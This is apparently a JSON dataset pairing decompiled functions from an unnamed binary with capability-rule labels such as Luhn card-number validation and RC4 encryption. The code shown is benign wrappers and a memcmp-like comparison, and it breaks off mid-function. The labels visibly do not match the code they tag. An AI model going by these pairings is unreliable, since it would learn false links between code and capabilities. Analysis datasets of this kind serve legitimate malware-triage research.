    "0041cfa6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cfa6(uint arg_8h)\n\n{\n    fcn.0041e535(arg_8h, 0, 10);\n    return;\n}\n",
        "token_count": 42
    },
    "0041cf9d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cf9d(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0041e505(arg_8h, 0, 10);\n    return;\n}\n",
        "token_count": 46
    },
    "0041e912": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e912(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.0041e565(arg_14h, arg_8h, arg_ch, arg_10h, 0);\n    return;\n}\n",
        "token_count": 67
    },
    "0041e972": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e972(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.0041e565(arg_14h, arg_8h, arg_ch, arg_10h, 1);\n    return;\n}\n",
        "token_count": 67
    },
    "0041e9bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e9bd(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004206ea(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 45
    },
    "00402a99": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402a99(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0040564d(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "00415bd8": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00415bd8(uint32_t *arg_8h, uint32_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if (arg_10h == 0) {\n        return 0;\n    }\n    if (arg_10h == 1) {\n        uVar3 = *arg_8h;\n        uVar1 = *arg_ch;\ncode_r0x00417225:\n        if (uVar3 == uVar1) {\n            return 0;\n        }\n        return (0 < uVar3 - uVar1) * 2 + -1;\n    }\n    if (arg_10h == 2) {\n        uVar3 = *arg_8h;\n        uVar1 = *arg_ch;\n        if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n            return iVar2;\n        }\n        uVar3 = *(arg_8h + 1);\n        uVar1 = *(arg_ch + 1);\n        goto code_r0x00417225;\n    }\n    if (arg_10h == 3) {\n        uVar3 = *arg_8h;\n        uVar1 = *arg_ch;\n        if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n            return iVar2;\n        }\n        uVar3 = *(arg_8h + 1);\n        uVar1 = *(arg_ch + 1);\n        if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n            return iVar2;\n        }\n        uVar3 = *(arg_8h + 2);\n        uVar1 = *(arg_ch + 2);\n        goto code_r0x00417225;\n    }\n    if (arg_10h == 4) {\n        uVar1 = *arg_ch;\n        uVar3 = *arg_8h;\n        if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n            return iVar2;\n        }\n        uVar3 = *(arg_8h + 1);\n        uVar1 = *(arg_ch + 1);\n        if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n            return iVar2;\n        }\n        uVar3 = *(arg_8h + 2);\n        uVar1 = *(arg_ch + 2);\n        if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n            return iVar2;\n        }\n        uVar3 = *(arg_8h + 3);\n        uVar1 = *(arg_ch + 3);\n        goto code_r0x00417225;\n    }\n    if (0x1f < arg_10h) {\n        do {\n            if (*arg_8h == *arg_ch) {\n                iVar2 = 0;\n            }\n            else {\n                uVar3 = *arg_8h & 0xff;\n                uVar1 = *arg_ch;\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 1);\n                uVar1 = *(arg_ch + 1);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 2);\n                uVar1 = *(arg_ch + 2);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                iVar2 = *(arg_8h + 3) - *(arg_ch + 3);\n                if (iVar2 != 0) {\n                    iVar2 = (0 < iVar2) * 2 + -1;\n                }\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            if (arg_8h[1] == arg_ch[1]) {\n                iVar2 = 0;\n            }\n            else {\n                uVar3 = arg_8h[1] & 0xff;\n                uVar1 = *(arg_ch + 1);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 5);\n                uVar1 = *(arg_ch + 5);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 6);\n                uVar1 = *(arg_ch + 6);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                iVar2 = *(arg_8h + 7) - *(arg_ch + 7);\n                if (iVar2 != 0) {\n                    iVar2 = (0 < iVar2) * 2 + -1;\n                }\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            if (arg_8h[2] == arg_ch[2]) {\n                iVar2 = 0;\n            }\n            else {\n                uVar3 = arg_8h[2] & 0xff;\n                uVar1 = *(arg_ch + 2);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 9);\n                uVar1 = *(arg_ch + 9);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 10);\n                uVar1 = *(arg_ch + 10);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                iVar2 = *(arg_8h + 0xb) - *(arg_ch + 0xb);\n                if (iVar2 != 0) {\n                    iVar2 = (0 < iVar2) * 2 + -1;\n                }\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            if (arg_8h[3] == arg_ch[3]) {\n                iVar2 = 0;\n            }\n            else {\n                uVar3 = arg_8h[3] & 0xff;\n                uVar1 = *(arg_ch + 3);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 0xd);\n                uVar1 = *(arg_ch + 0xd);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 0xe);\n                uVar1 = *(arg_ch + 0xe);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                iVar2 = *(arg_8h + 0xf) - *(arg_ch + 0xf);\n                if (iVar2 != 0) {\n                    iVar2 = (0 < iVar2) * 2 + -1;\n                }\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            if (arg_8h[4] == arg_ch[4]) {\n                iVar2 = 0;\n            }\n            else {\n                uVar1 = *(arg_ch + 4);\n                uVar3 = *(arg_8h + 4);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 0x11);\n                uVar1 = *(arg_ch + 0x11);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 0x12);\n                uVar1 = *(arg_ch + 0x12);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                iVar2 = *(arg_8h + 0x13) - *(arg_ch + 0x13);\n                if (iVar2 != 0) {\n                    iVar2 = (0 < iVar2) * 2 + -1;\n                }\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            if (arg_8h[5] == arg_ch[5]) {\n                iVar2 = 0;\n            }\n            else {\n                uVar3 = arg_8h[5] & 0xff;\n                uVar1 = *(arg_ch + 5);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 0x15);\n                uVar1 = *(arg_ch + 0x15);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 0x16);\n                uVar1 = *(arg_ch + 0x16);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                iVar2 = *(arg_8h + 0x17) - *(arg_ch + 0x17);\n                if (iVar2 != 0) {\n                    iVar2 = (0 < iVar2) * 2 + -1;\n                }\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            if (arg_8h[6] == arg_ch[6]) {\n                iVar2 = 0;\n            }\n            else {\n                uVar3 = arg_8h[6] & 0xff;\n                uVar1 = *(arg_ch + 6);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 0x19);\n                uVar1 = *(arg_ch + 0x19);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 0x1a);\n                uVar1 = *(arg_ch + 0x1a);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                iVar2 = *(arg_8h + 0x1b) - *(arg_ch + 0x1b);\n                if (iVar2 != 0) {\n                    iVar2 = (0 < iVar2) * 2 + -1;\n                }\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            if (arg_8h[7] == arg_ch[7]) {\n                iVar2 = 0;\n            }\n            else {\n                uVar3 = arg_8h[7] & 0xff;\n                uVar1 = *(arg_ch + 7);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 0x1d);\n                uVar1 = *(arg_ch + 0x1d);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 0x1e);\n                uVar1 = *(arg_ch + 0x1e);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                iVar2 = *(arg_8h + 0x1f) - *(arg_ch + 0x1f);\n                if (iVar2 != 0) {\n                    iVar2 = (0 < iVar2) * 2 + -1;\n                }\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            arg_10h = arg_10h - 0x20;\n            arg_8h = arg_8h + 8;\n            arg_ch = arg_ch + 8;\n        } while (0x1f < arg_10h);\n    }\n    // switch table (32 cases) at 0x4172d0\n    switch(arg_10h) {\n    default:\n        goto code_r0x004164da;\n    case 1:\n        goto code_r0x004168f6;\n    case 2:\n        goto code_r0x00416d3b;\n    case 3:\n        goto code_r0x00417171;\n    case 4:\n        goto code_r0x00416457;\n    case 5:\n        goto code_r0x0041685f;\n    case 6:\n        goto code_r0x00416ca4;\n    case 7:\n        goto code_r0x004170da;\n    case 8:\n        goto code_r0x004163c0;\n    case 9:\n        goto code_r0x004167c7;\n    case 10:\n        goto code_r0x00416c0c;\n    case 0xb:\n        goto code_r0x00417043;\n    case 0xc:\n        goto code_r0x00416328;\n    case 0xd:\n        goto code_r0x00416730;\n    case 0xe:\n        goto code_r0x00416b75;\n    case 0xf:\n        goto code_r0x00416fab;\n    case 0x10:\n        goto code_r0x00416291;\n    case 0x11:\n        goto code_r0x00416699;\n    case 0x12:\n        goto code_r0x00416ade;\n    case 0x13:\n        goto code_r0x00416f14;\n    case 0x14:\n        goto code_r0x004161fa;\n    case 0x15:\n        goto code_r0x00416602;\n    case 0x16:\n        goto code_r0x00416a47;\n    case 0x17:\n        goto code_r0x00416e7d;\n    case 0x18:\n        goto code_r0x00416163;\n    case 0x1a:\n        goto code_r0x004169b0;\n    case 0x1b:\n        goto code_r0x00416de6;\n    case 0x1c:\n        uVar1 = *(arg_8h + (arg_10h - 0x1c));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x1c))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x1c));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x1b));\n            uVar1 = *(arg_ch + (arg_10h - 0x1b));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x1a));\n            uVar1 = *(arg_ch + (arg_10h - 0x1a));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x19)) - *(arg_ch + (arg_10h - 0x19));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00416163:\n        uVar1 = *(arg_8h + (arg_10h - 0x18));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x18))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x18));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x17));\n            uVar1 = *(arg_ch + (arg_10h - 0x17));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x16));\n            uVar1 = *(arg_ch + (arg_10h - 0x16));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x15)) - *(arg_ch + (arg_10h - 0x15));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x004161fa:\n        uVar1 = *(arg_8h + (arg_10h - 0x14));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x14))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x14));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x13));\n            uVar1 = *(arg_ch + (arg_10h - 0x13));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x12));\n            uVar1 = *(arg_ch + (arg_10h - 0x12));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x11)) - *(arg_ch + (arg_10h - 0x11));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00416291:\n        uVar1 = *(arg_8h + (arg_10h - 0x10));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x10))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x10));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0xf));\n            uVar1 = *(arg_ch + (arg_10h - 0xf));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0xe));\n            uVar1 = *(arg_ch + (arg_10h - 0xe));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0xd)) - *(arg_ch + (arg_10h - 0xd));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00416328:\n        if (*(arg_8h + (arg_10h - 0xc)) == *(arg_ch + (arg_10h - 0xc))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = *(arg_ch + (arg_10h - 0xc));\n            uVar3 = *(arg_8h + (arg_10h - 0xc));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0xb));\n            uVar1 = *(arg_ch + (arg_10h - 0xb));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 10));\n            uVar1 = *(arg_ch + (arg_10h - 10));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 9)) - *(arg_ch + (arg_10h - 9));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x004163c0:\n        uVar1 = *(arg_8h + (arg_10h - 8));\n        if (uVar1 == *(arg_ch + (arg_10h - 8))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 8));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 7));\n            uVar1 = *(arg_ch + (arg_10h - 7));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 6));\n            uVar1 = *(arg_ch + (arg_10h - 6));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 5)) - *(arg_ch + (arg_10h - 5));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00416457:\n        uVar1 = *(arg_8h + (arg_10h - 4));\n        if (uVar1 == *(arg_ch + (arg_10h - 4))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 4));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 3));\n            uVar1 = *(arg_ch + (arg_10h - 3));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 2));\n            uVar1 = *(arg_ch + (arg_10h - 2));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 1)) - *(arg_ch + (arg_10h - 1));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 == 0) {\ncode_r0x004164da:\n            iVar2 = 0;\n        }\n        return iVar2;\n    case 0x1d:\n        uVar1 = *(arg_8h + (arg_10h - 0x1d));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x1d))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x1d));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x1c));\n            uVar1 = *(arg_ch + (arg_10h - 0x1c));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x1b));\n            uVar1 = *(arg_ch + (arg_10h - 0x1b));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x1a)) - *(arg_ch + (arg_10h - 0x1a));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    case 0x19:\n        uVar1 = *(arg_8h + (arg_10h - 0x19));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x19))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x19));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x18));\n            uVar1 = *(arg_ch + (arg_10h - 0x18));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x17));\n            uVar1 = *(arg_ch + (arg_10h - 0x17));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x16)) - *(arg_ch + (arg_10h - 0x16));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00416602:\n        uVar1 = *(arg_8h + (arg_10h - 0x15));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x15))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x15));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x14));\n            uVar1 = *(arg_ch + (arg_10h - 0x14));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x13));\n            uVar1 = *(arg_ch + (arg_10h - 0x13));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x12)) - *(arg_ch + (arg_10h - 0x12));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00416699:\n        uVar1 = *(arg_8h + (arg_10h - 0x11));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x11))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x11));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x10));\n            uVar1 = *(arg_ch + (arg_10h - 0x10));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0xf));\n            uVar1 = *(arg_ch + (arg_10h - 0xf));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0xe)) - *(arg_ch + (arg_10h - 0xe));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00416730:\n        uVar1 = *(arg_8h + (arg_10h - 0xd));\n        if (uVar1 == *(arg_ch + (arg_10h - 0xd))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0xd));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < 